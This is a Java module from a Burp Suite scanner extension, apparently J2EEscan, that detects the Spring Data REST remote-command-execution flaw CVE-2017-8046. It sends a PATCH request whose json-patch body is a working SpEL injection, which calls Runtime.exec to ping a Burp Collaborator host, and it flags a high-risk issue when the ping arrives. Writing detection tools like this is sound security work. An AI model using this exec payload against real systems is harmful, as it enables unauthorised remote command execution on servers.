package burp.j2ee.issues.impl;

import static burp.HTTPMatcher.isJavaApplicationByURL;
import burp.HTTPParser;
import static burp.HTTPParser.isJSONRequest;
import burp.IBurpCollaboratorClientContext;
import burp.IBurpCollaboratorInteraction;
import burp.IBurpExtenderCallbacks;
import burp.IExtensionHelpers;
import burp.IHttpRequestResponse;
import burp.IRequestInfo;
import burp.IScanIssue;
import burp.IScannerInsertionPoint;
import burp.j2ee.Confidence;
import burp.j2ee.CustomScanIssue;
import burp.j2ee.Risk;
import burp.j2ee.issues.IModule;

import java.io.PrintWriter;
import java.net.URL;
import java.util.ArrayList;
import java.util.LinkedHashSet;
import java.util.List;

/**
 *
 * Security issue in Spring Data REST (CVE-2017-8046)
 *
 *
 * References:
 * https://spring.io/blog/2018/03/06/security-issue-in-spring-data-rest-cve-2017-8046
 *
 *
 */
public class SpringBootRestRCE implements IModule {

    private static final String TITLE = "Spring Data REST - Remote Command Execution CVE-2017-8046";
    private static final String DESCRIPTION = "J2EEscan identified the a remote command execution on Spring Data REST (CVE-2017-8046).<br />";
    private static final String REMEDY = "Update the remote library with the last security patches provided by Pivotal:<br />"
            + "<ul><li>https://spring.io/blog/2018/03/06/security-issue-in-spring-data-rest-cve-2017-8046</li></ul>";

    // List of applications already tested, to avoid duplicate scans on the same item
    private static LinkedHashSet hsc = new LinkedHashSet();

    private PrintWriter stderr;
    private PrintWriter stdout;

    
    public List<IScanIssue> scan(IBurpExtenderCallbacks callbacks, IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint) {

        IExtensionHelpers helpers = callbacks.getHelpers();
        stderr = new PrintWriter(callbacks.getStderr(), true);
        stdout = new PrintWriter(callbacks.getStdout(), true);

        List<IScanIssue> issues = new ArrayList<>();

        IRequestInfo reqInfo = helpers.analyzeRequest(baseRequestResponse);
        URL url = reqInfo.getUrl();

        if (!isJavaApplicationByURL(url)) {
            return issues;
        }

        String contentTypeHeader = HTTPParser.getRequestHeaderValue(reqInfo, "Content-type");

        if (contentTypeHeader == null) {
            return issues;
        }

        // Skip not JSON requests
        if (!isJSONRequest(contentTypeHeader)) {
            return issues;
        }

        String host = url.getHost();
        String system = host.concat(url.getPath());

        // System not yet tested for this vulnerability
        if (!hsc.contains(system)) {

            hsc.add(system);

            List<String> headers = reqInfo.getHeaders();
            String firstHeader = headers.get(0);
            headers.set(0, firstHeader.replaceFirst("POST ", "PATCH "));

            List<String> headersWithContentTypePatch = HTTPParser.addOrUpdateHeader(headers, "Content-type", "application/json-patch+json");
            List<String> headersWithContentTypePatchAndAccept = HTTPParser.addOrUpdateHeader(headersWithContentTypePatch, "Accept", "*/*");

            // Collaborator context
            IBurpCollaboratorClientContext collaboratorContext = callbacks.createBurpCollaboratorClientContext();

            // New collaborator unique URI generated ( example f2ivf62a9k7w14h8o8cg7x10prvhj6.burpcollaborator.net )
            String currentCollaboratorPayload = collaboratorContext.generatePayload(true);

            // Payload to trigger remote ping
            String payload = String.format("\\\"ping -c 2 %s\\\"", currentCollaboratorPayload);
            String finalPayload = "[{ \"op\" : \"replace\", \"path\" : \"T(org.springframework.util.StreamUtils).copy(T(java.lang.Runtime).getRuntime().exec(" + payload + ").getInputStream(), T(org.springframework.web.context.request.RequestContextHolder).currentRequestAttributes().getResponse().getOutputStream()).x\", \"value\" : \"j2eescan\" }]";

            byte[] message = helpers.buildHttpMessage(headersWithContentTypePatchAndAccept, finalPayload.getBytes());
            IHttpRequestResponse resp = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), message);

            // Poll Burp Collaborator for remote interaction
            List<IBurpCollaboratorInteraction> collaboratorInteractions = collaboratorContext.fetchCollaboratorInteractionsFor(currentCollaboratorPayload);

            if (!collaboratorInteractions.isEmpty()) {
                issues.add(new CustomScanIssue(
                        baseRequestResponse.getHttpService(),
                        reqInfo.getUrl(),
                        resp,
                        TITLE,
                        DESCRIPTION,
                        REMEDY,
                        Risk.High,
                        Confidence.Certain
                ));
            }
            
            
        } 

        return issues;

    }

}
